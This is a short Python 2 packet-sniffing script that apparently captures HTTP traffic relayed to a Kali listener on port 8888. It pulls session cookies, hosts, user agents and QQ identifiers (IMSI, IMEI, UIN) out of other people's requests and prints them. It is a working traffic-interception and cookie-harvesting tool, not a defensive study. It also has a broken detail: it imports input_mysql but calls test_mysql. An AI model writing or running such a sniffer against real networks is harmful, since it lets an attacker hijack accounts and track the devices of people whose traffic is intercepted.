import pcap
import dpkt
import socket
import input_mysql
import time

def once_work(ptime,pdata):
####__init__ variable
	host=""
	urlex=""
	cookie=""
	user_agent=""
	str_host1='Host:'
	str_host2='host:'
	str_connection='Connection'
	str_get='GET'
	str_post='POST'
	str_cookie='Cookie'
	str_http='HTTP/1.1'
	str_user_agent='User-Agent'
###now connect the mysqldb
	conn=test_mysql.con()
###now go work
	p=dpkt.ethernet.Ethernet(pdata)
###package information
	ip=p.data
	src=socket.inet_ntoa(ip.src)####src ip
	sport=str(ip.data.sport)###src port
###tcp information with port 80 or 8888,because the listening port  is 8888 by kali
	if p.data.data.__class__.__name__=='TCP':
		if p.data.data.dport==80 or p.data.data.dport==8888:
			DATA=p.data.data.data
			DATA_list=p.data.data.data.split('\n')
###find GET or POST in urlex
###find cookie in DATA
			for a in DATA_list:
				if a.find(str_get)>=0:
					urlex=a[4:a.find(str_http)]
				elif a .find(str_post)>=0:
					urlex=a[5:a.find(str_http)]
				if a.find(str_cookie)>=0:
					cookie=a[7:]
###find host name of internet
				if a.find(str_host1)>=0 or a.find(str_host2)>=0:
					host=a[6:]
###find user-agnet
				if a.find(str_user_agent)>=0:
					user_agent=a[12:]
####find str in data and return the index of str,if not return -1
			if p.data.data.data.__len__()>0:
				print  "==================package================"
				print "this package from "+src+":"+sport
				print p.data.data.data
				print p.data.data.data.split('\n')
				print  "==================host==================="
				print host
				#print urlex
				if urlex.find('?')>=0 and urlex.find('qq'):
					print  "==================qq_info==================" 
					info_list=urlex.split('&')
					for a in info_list[2:]:
						if a.find('imsi')>=0:
							print(a)
						if a.find('imei')>=0:
							print(a)
						if a.find('uin')>=0 or a.find('Uin')>=0:
							print(a)
				print  "==================User-Agent==================" 
				print user_agent
				if cookie:
					print  "==================cookie================="
					print cookie
				print  "========================================="


if __name__=='__main__':
	pc=pcap.pcap()
	pc.setfilter('tcp port 8888')
	for ptime,pdata in pc:
		once_work(ptime,pdata)
